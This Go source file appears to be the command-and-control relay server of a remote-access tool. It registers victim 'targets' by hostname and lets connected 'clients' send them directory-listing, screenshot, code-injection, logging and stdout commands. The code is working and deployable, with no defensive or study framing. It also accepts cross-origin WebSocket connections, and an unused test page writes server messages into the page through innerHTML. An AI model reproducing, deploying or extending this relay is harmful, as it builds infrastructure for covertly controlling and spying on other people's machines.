package main

import (
	"encoding/json"
	"flag"
	"html/template"
	"log"
	"net/http"
	"os"
	"reflect"

	"github.com/d0minikt/dragons/lib"
	"github.com/gorilla/websocket"
)

// connection

var upgrader = websocket.Upgrader{
	// allow cross-origin
	CheckOrigin: func(r *http.Request) bool { return true },
}

// app
var clients = make(map[string]lib.Client)
var targets = make(map[string]lib.Target)

func notifyClients(ws *websocket.Conn) {
	keys := reflect.ValueOf(targets).MapKeys()
	strkeys := make([]string, len(keys))
	for i := 0; i < len(keys); i++ {
		strkeys[i] = keys[i].String()
	}

	for _, value := range clients {
		value.Socket.WriteJSON(lib.DataAction{
			Type: "DATA",
			Payload: lib.Data{
				Targets: strkeys,
			},
		})
	}
}

func handleWebsocketConnection(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("upgrade:", err)
		return
	}
	log.Println("Server running")
	defer ws.Close()

	// init connection
	keys := reflect.ValueOf(targets).MapKeys()
	strkeys := make([]string, len(keys))
	for i := 0; i < len(keys); i++ {
		strkeys[i] = keys[i].String()
	}
	ws.WriteJSON(lib.DataAction{
		Type: "DATA",
		Payload: lib.Data{
			Targets: strkeys,
		},
	})

	var userType string
	var id string

	for {
		// read message
		_, message, err := ws.ReadMessage()
		if err != nil {
			log.Println("read:", err)
			// handle disconnect
			if len(id) > 0 {
				if _, ok := targets[id]; ok && userType == "TARGET" {
					delete(targets, id)
					notifyClients(ws)
				} else if _, ok := clients[id]; ok && userType == "CLIENT" {
					delete(clients, id)
				}
			}
			break
		}
		action := lib.Action{}
		json.Unmarshal(message, &action)

		switch action.Type {
		case "CONNECT_TARGET":
			action := lib.ConnectTargetAction{}
			err := json.Unmarshal(message, &action)

			log.Println("target connected")
			if err != nil {
				log.Fatal("failed to unmarshal")
			}

			userType = "TARGET"
			id, _ = lib.RandomHex(4)
			id = action.Payload.Net.Hostname + " - " + id
			targets[id] = lib.Target{
				Socket:  ws,
				Details: action.Payload,
			}
			// notify clients
			notifyClients(ws)
		case "CONNECT_CLIENT":
			log.Println("client connected")
			userType = "CLIENT"
			id, _ = lib.RandomHex(12)
			clients[id] = lib.Client{
				Socket: ws,
			}
		case "CONNECT_TO_TARGET":
			action := lib.StringAction{}
			json.Unmarshal(message, &action)
			if target, ok := targets[action.Payload]; ok {
				target.Socket.WriteJSON(lib.StringAction{
					Type:    "CONNECT_TO_TARGET",
					Payload: id,
				})
				ws.WriteJSON(lib.TargetConnectedAction{
					Type:    "TARGET_CONNECTED",
					Payload: target.Details,
					Key:     action.Payload,
				})
			}
		case "GET_DIRECTORY":
			fallthrough
		case "SCREENSHOT":
			fallthrough
		case "INJECT":
			fallthrough
		case "LOG":
			fallthrough
		case "STDOUT":
			action := lib.QueryAction{}
			json.Unmarshal(message, &action)
			if userType == "TARGET" {
				if client, ok := clients[action.To]; ok {
					action.From = id
					client.Socket.WriteJSON(action)
				}
			} else if userType == "CLIENT" {
				if target, ok := targets[action.To]; ok {
					action.From = id
					target.Socket.WriteJSON(action)
				}
			}
		default:
			log.Println(string(message))
		}

		// err = ws.WriteMessage(websocket.TextMessage, []byte("YOURE AN OLD STAR"))
		// if err != nil {
		// 	log.Println("write:", err)
		// 	break
		// }
	}
}

func home(w http.ResponseWriter, r *http.Request) {
	w.Write([]byte("Hello world"))
}

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		log.Fatal("$PORT must be set")
	}
	addr := flag.String("addr", "localhost:"+port, "http service address")

	flag.Parse()
	log.SetFlags(0)
	http.HandleFunc("/ws", handleWebsocketConnection)
	http.HandleFunc("/", home)
	log.Fatal(http.ListenAndServe(*addr, nil))
}

var homeTemplate = template.Must(template.New("").Parse(`
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<script>  
window.addEventListener("load", function(evt) {

    var output = document.getElementById("output");
    var input = document.getElementById("input");
    var ws;

    var print = function(message) {
        var d = document.createElement("div");
        d.innerHTML = message;
        output.appendChild(d);
    };

    document.getElementById("open").onclick = function(evt) {
        if (ws) {
            return false;
        }
        ws = new WebSocket("{{.}}");
        ws.onopen = function(evt) {
            print("OPEN");
        }
        ws.onclose = function(evt) {
            print("CLOSE");
            ws = null;
        }
        ws.onmessage = function(evt) {
            print("RESPONSE: " + evt.data);
        }
        ws.onerror = function(evt) {
            print("ERROR: " + evt.data);
        }
        return false;
    };

    document.getElementById("send").onclick = function(evt) {
        if (!ws) {
            return false;
        }
        print("SEND: " + input.value);
        ws.send(input.value);
        return false;
    };

    document.getElementById("close").onclick = function(evt) {
        if (!ws) {
            return false;
        }
        ws.close();
        return false;
    };

});
</script>
</head>
<body>
<table>
<tr><td valign="top" width="50%">
<p>Click "Open" to create a connection to the server, 
"Send" to send a message to the server and "Close" to close the connection. 
You can change the message and send multiple times.
<p>
<form>
<button id="open">Open</button>
<button id="close">Close</button>
<p><input id="input" type="text" value="Hello world!">
<button id="send">Send</button>
</form>
</td><td valign="top" width="50%">
<div id="output"></div>
</td></tr></table>
</body>
</html>
`))
